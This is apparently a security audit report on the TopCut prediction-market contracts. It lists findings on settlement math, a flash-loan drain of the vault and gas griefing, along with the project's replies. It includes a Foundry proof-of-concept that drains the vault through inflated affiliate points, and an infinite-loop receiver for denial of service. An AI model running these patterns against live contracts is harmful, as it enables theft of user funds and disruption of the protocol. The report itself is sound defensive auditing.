# Security review report
**Project:** [`PossumLabsCrypto/TopCut`](https://github.com/PossumLabsCrypto/TopCut)   
**Commit:** [9acbd7dcc7088dca298fe968f88605bb17414ea6](https://github.com/PossumLabsCrypto/TopCut/commit/9acbd7dcc7088dca298fe968f88605bb17414ea6)   
**Start Date:** 2025-06-11

**Scope:**
* `src/TopCutMarket.sol` (nSLOC: 220, coverage: 100% lines / 100% statements / 100% branches / 100% functions)
* `src/TopCutNFT.sol` (nSLOC: 32, coverage: 100% lines / 100% statements / 100% branches / 100% functions)
* `src/TopCutVault.sol` (nSLOC: 129, coverage: 100% lines / 100% statements / 100% branches / 100% functions)

**Overview**
* **[M-01]** Cohort settlement can underpay, overpay, or enable risk-free sniping for single predictions
* **[M-02]** Flash loan attack can drain `TopCutVault` via inflated affiliate points
* **[L-01]** ERC20 `transfer` in `extractTokenBalance` is not compatible with non-standard ERC20 tokens
* **[L-02]** Settlement price timestamp may significantly deviate from expectation leading to unfair outcomes for traders
* **[L-03]** Malicious `_recipient` in reward distribution can consume all available gas causing DoS during further execution
* **[I-01]** Incorrect comment about NFT mint price
* **[I-02]** Constant `metadataURI` is stored for each minted NFT
* **[I-03]** Empty settlement of cohort 2 required after each market deployment
* **[I-04]** Small amount of ETH accumulates in contract due to share math mismatch
* **[I-05]** Contract could run out of funds for keeper if minimum keeper reward exceeds available balance

---

## **[M-01]**  Cohort settlement can underpay, overpay, or enable risk-free sniping for single predictions

### Description

The current cohort settlement logic can result in several edge cases:

- If `_cohortSize < 11`, then `_cohortSize * TRADE_SIZE < WIN_SIZE`, meaning there are not enough funds collected to pay out the winner the full `WIN_SIZE`. This could result in the contract being unable to pay the promised reward, or in the winner receiving more than their fair share.
- If `_cohortSize > 11` but `_cohortSize % 11 != 0`, then `_cohortSize * TRADE_SIZE > cohortWinners * WIN_SIZE`, resulting in excess funds accumulating in the contract that are not distributed to winners.
- If `_cohortSize == 1`, a single participant can observe that no other trades have been made and snipe the round just before settlement, paying only `TRADE_SIZE` and receiving `WIN_SIZE` risk-free.

### Recommendation

It is recommended to consider the following mitigation measures:
- For cohorts with fewer than 11 predictions, consider refunding traders or scaling the winner payout to the actual funds collected.
- For cohorts where `_cohortSize % 11 != 0`, consider distributing the entire pool among winners.
- Implement anti-sniping measures for single-entry cohorts, such as requiring a minimum number of participants or scaling rewards based on participation.

**Status:**  
🆗 Acknowledged

> This issue is closely related to the discussion about rounding and cohort size effects. The surplus from cohorts with more than 11 participants helps offset temporary deficits when cohorts have fewer than 11 traders.
>
> During the ramp-up phase, Possum Labs will ensure that each cohort has at least 11 trades. If a market's usage declines over time, trade access will be removed from the UI and access points (leaving only claim functionality) to protect regular users from accumulating bad debt. Users interacting directly with the contracts are expected to understand the risks, and sniping under these conditions is actually encouraged to help remove otherwise locked ETH from the contract.
>
> This design decision has been discussed in every audit:  
> - Fully refunding users creates bad debt, since frontends and the Vault have already received their share.  
> - Switching to a pull-only pattern removes guaranteed incentives for UI hosts and complicates the Vault logic, undermining its utility as a general-purpose incentive framework (where any contract can call `updatePoints()` and participate in the affiliate/loyalty system).  
> - Deducting fees and refunding only the remainder means early users must accept a certain loss if participation is low, which strongly discourages the first 10 predictions.
> 
> While not perfect, the current approach offers the best balance of tradeoffs for this MVP.  

## **[M-02]** Flash loan attack can drain `TopCutVault` via inflated affiliate points

### Description

A flash loan attack is possible in the current implementation of `TopCutVault`. An attacker can call `updatePoints` with a very large ETH amount (using a flash loan), causing `affiliatePoints[_refID]` to become much greater than `totalRedeemedAP`. This skews the calculation in `quoteAffiliateReward`, allowing the attacker to claim nearly the entire ETH balance of the vault by immediately calling `claimAffiliateReward`.   

However, the attack is only profitable when `address(this).balance > totalRedeemedAP`, which is unlikely in normal operation but could be possible in the early days of the protocol if balances greater than 1 ETH (the initial value of `totalRedeemedAP`) are accrued through NFT sales and predictions before any reward claims have been made.

### Proof of Concept

```solidity
function testAttack_flashloanDrainsVaultViaAffiliatePoints() public {
    // Setup: Alice mints an NFT (ID 40)
    uint256 mintCost = refNFT.MINT_FEE_ETH();
    vm.startPrank(Alice);
    refNFT.mint{value: mintCost}(); // Alice owns NFT 40
    vm.stopPrank();

    // Vault is funded with a significant amount of ETH (not organic, just for demonstration)
    uint256 vaultSeed = 200 ether;
    vm.prank(treasury);
    (bool sent,) = address(vault).call{value: vaultSeed}("");
    sent = true;
    assertGt(address(vault).balance, vaultSeed);

    // Simulate a flashloan: Alice gets a huge amount of ETH temporarily
    uint256 flashloanAmount = 400 ether;
    vm.deal(Alice, flashloanAmount);

    // Alice uses the flashloan to massively boost affiliatePoints[40]
    vm.startPrank(Alice);
    vault.updatePoints{value: flashloanAmount}(Alice, 40); // attribute huge points to NFT 40

    // Calculate expected reward: nearly all vault ETH (since affiliatePoints[40] >> totalRedeemedAP)
    uint256 points = vault.affiliatePoints(40);
    uint256 expectedETH = vault.quoteAffiliateReward(points);

    // Alice claims the affiliate reward for NFT 40
    vault.claimAffiliateReward(40, points, expectedETH, block.timestamp);

    // Alice repays the flashloan (simulated, not enforced in this test)
    // (In a real attack, Alice would use a contract to atomically repay the flashloan)

    // Assert: Vault is nearly drained, Alice received almost all ETH
    assertApproxEqAbs(address(vault).balance, 0 ether, 2 ether); // less than 2 ETH left
    assertGt(expectedETH, vaultSeed * 99 / 100); // Alice got >99% of vault's ETH

    vm.stopPrank();
}
```

### Recommendation
It is recommended to redesign the affiliate reward calculation to prevent a single large deposit from capturing a disproportionate share of the vault.

**Status:**  
✅ Resolved in commit [cba908a00be3954c2c0cd87b13076ed1fef9d720](https://github.com/PossumLabsCrypto/TopCut/commit/cba908a00be3954c2c0cd87b13076ed1fef9d720).

## **[L-01]** ERC20 `transfer` in `extractTokenBalance` is not compatible with non-standard ERC20 tokens

### Description

The `extractTokenBalance` function currently uses `IERC20(_token).transfer(msg.sender, balanceToken)` to transfer ERC20 tokens. This approach is not compatible with non-standard ERC20 tokens, such as USDT on mainnet, which do not return a boolean value on transfer. In such cases, Solidity will attempt to decode a non-existent return value as a bool, causing a revert. Additionally, tokens that return `false` on a failed transfer (instead of reverting) will result in a silent failure, as the return value is ignored and not checked, potentially leading to loss of funds or unexpected behavior.

### Recommendation

It is recommended to replace the direct call to `IERC20(_token).transfer` with OpenZeppelin's `SafeERC20.safeTransfer` method. This utility handles both non-standard tokens that do not return a value and tokens that return `false` on failure, ensuring compatibility and proper error handling.

**Status:**  
✅ Resolved in commit [7b20302eabe20e72dc3e537027150d6f0282f60e](https://github.com/PossumLabsCrypto/TopCut/commit/7b20302eabe20e72dc3e537027150d6f0282f60e)

## **[L-02]** Settlement price timestamp may significantly deviate from expectation leading to unfair outcomes for traders

### Description

When traders cast their price predictions, they are effectively predicting the price at the scheduled settlement time for their cohort (`nextSettlement + TRADE_DURATION` at the time of casting). However, the actual execution of `settleCohort` can be severely delayed due to sequencer outages or issues with oracle price data availability. In such cases, the price used to determine winners during settlement may correspond to a timestamp that is far from the originally expected settlement time. This can result in unfair outcomes for traders, as their predictions may no longer be relevant to the actual price used for settlement.

### Recommendation

It is recommended to implement additional checks to ensure that the oracle price used for settlement is sufficiently close to the originally scheduled settlement time. Consider enforcing a maximum allowed deviation between the expected and actual price timestamps, or refunding traders if a timely and fair settlement cannot be achieved. Alternatively, document this risk clearly for users.

**Status:**  
🆗 Acknowledged

> Thank you for raising this point. In the current design, cohorts are settled as soon as the price feed becomes available again. While a significant outage could indeed cause the settlement price timestamp to deviate from the originally expected time, such events should be extremely rare.
>
> Finding a safe workaround is challenging, allowing the market to use anything other than the latest Chainlink price during settlement could introduce new and potentially more severe issues. Ultimately, this is a risk that users implicitly accept when interacting with protocols on L2s. While it could lead to unexpected outcomes, the likelihood of such a scenario is very low in practice.

## **[L-03]** Malicious `_recipient` in reward distribution can consume all available gas causing DoS during further execution

### Description

In the `_distributeLoyaltyReward` function, the contract sends ETH to `_recipient` using a low-level call:
```solidity
(bool sent,) = payable(_recipient).call{value: loyaltyDistribution}("");
```
By default, this forwards all available gas to the recipient. A malicious contract can exploit this by consuming all the gas (subject to the 63/64 rule), leaving only 1/64 of the original gas for the remaining execution. If this remaining gas is insufficient, subsequent logic and integrations, such as those in `castPrediction`, may fail with an `OutOfGas` error, potentially breaking the protocol flow or causing DoS.

### Proof of Concept

Add to `DOScontract`:  
```solidity
uint256 private counter;

receive() external payable {
    while(true) {
        counter++;
    }
}
```

Add to `TopCutTest` contract and `testSuccess_updatePoints_triggerLoyaltyReward` test case:
```solidity
uint256 counter;

function testSuccess_updatePoints_triggerLoyaltyReward() public {
    ...

    // add to bottom of test case to simulate further gas consumption
    while(counter < 10000) {
        counter++;
    }
}
```

Run with: `forge test --gas-limit 32000000`


### Recommendation

It is recommended to limit the gas forwarded in the low-level call to a safe value which is enough for a simple ETH transfer and some logic but prevents the recipient from consuming all available gas, for example:
```solidity
(bool sent,) = payable(_recipient).call{value: loyaltyDistribution, gas: 23000}("");
```

**Status:**  
✅ Resolved in commit [a470e503ee8e79ff1a576a6b3c3f3db4a49f7d67](https://github.com/PossumLabsCrypto/TopCut/commit/a470e503ee8e79ff1a576a6b3c3f3db4a49f7d67).

## **[I-01]** Incorrect comment about NFT mint price

### Description

The contract-level comment states that "Affiliate NFTs can be minted by paying the increasing minting price in ETH." However, the mint price is set by the constant `MINT_FEE_ETH` and does not increase. This could mislead users or developers into expecting a dynamic or rising mint price, when in reality the price is always fixed at 1 ETH per mint.

### Recommendation

It is recommended to edit the comment to accurately reflect the fixed mint price.

**Status:**  
✅ Resolved in commit [9a02050debf3c279a00ccfcf01874ecf0ccf36e8](https://github.com/PossumLabsCrypto/TopCut/commit/9a02050debf3c279a00ccfcf01874ecf0ccf36e8).


## **[I-02]** Constant `metadataURI` is stored for each minted NFT

### Description

The `TopCutNFT` contract currently stores the same `metadataURI` string for every minted NFT by calling `_setTokenURI(totalSupply, metadataURI)` in both the `mint` and `_mintInitial` functions. This results in redundant storage usage, as each NFT stores an identical URI value in contract storage. This increases gas costs for minting and unnecessarily bloats the contract's storage.

### Recommendation

It is recommended to override the `tokenURI` method to return the constant `metadataURI` for every token, instead of storing it individually for each NFT. This approach saves storage and reduces gas costs, as the metadata is only stored once and returned dynamically for all tokens.

**Status:**  
🆗 Acknowledged

> Intended.

## **[I-03]** Empty settlement of cohort 2 required after each market deployment

### Description

After deploying a new `TopCutMarket` contract, cohort 1 is always the first to be filled with predictions, while cohort 2 remains empty. As a result, before the first real settlement can occur, an empty settlement of cohort 2 must be performed. This is necessary to transition the active cohort to 1, which can be settled after `TRADE_DURATION` has elapsed. 

### Recommendation
It is recommended to automatically handling the empty settlement of cohort 2 during deployment.

**Status:**  
🆗 Acknowledged

> Intended.


## **[I-04]** Small amount of ETH accumulates in contract due to share math mismatch

### Description

Currently, 9% of each trade is allocated to the vault, frontend, and keeper, leaving 91% of `TRADE_SIZE` for winners. For every 11 trades, this results in `11 * 91% * TRADE_SIZE = 10.01 * TRADE_SIZE` available for winners, but `WIN_SIZE` is set to `10 * TRADE_SIZE`. This means that after each cohort settlement, `0.01 * TRADE_SIZE` per 11 trades remains unclaimed in the contract. Additionally, minor amounts may accumulate due to precision loss when dividing the vault, frontend, and keeper shares by `SHARE_PRECISION`. Over time, this could lead to a growing balance of ETH in the contract.

### Recommendation

It is recommended to adjust the calculation of `WIN_SIZE` to ensure that all ETH (after shares are distributed) is claimable by winners.

**Status:**  
🆗 Acknowledged

> Correct, the remainder from rounding and the share math results in a surplus accumulating in the contract. This surplus can help offset temporary cohorts with fewer than 11 predictions.
>
> Importantly, if or when a market eventually becomes inactive, the accumulated ETH is not permanently locked, keepers can still extract it by calling `settleCohort` and receiving the minimum keeper reward. The gradual accumulation of this cushion is intentional and helps maintain system stability.

## **[I-05]** Contract could run out of funds for keeper if minimum keeper reward exceeds available balance

### Description

The contract guarantees a minimum keeper reward (`MIN_KEEPER_REWARD`) for settling a cohort, even if the calculated reward based on cohort size (`_cohortSize * KEEPER_REWARD_UNIT`) is lower. If many consecutive cohorts are settled with very few or no trades, the contract may not have enough ETH to pay the minimum keeper reward. This could result in keepers being unable to claim their rewards, potentially stalling the protocol.

### Recommendation

It is recommended to add documentation to clarifying this edge case for keepers.

**Status:**  
🆗 Acknowledged

> This issue is indeed related to the discussed bad debt scenario, which aligns with the thresholds and tradeoffs highlighted in the other issues. The risk of running out of funds for the keeper is mitigated once there is minimal activity in a cohort, but the underlying design tradeoff remains.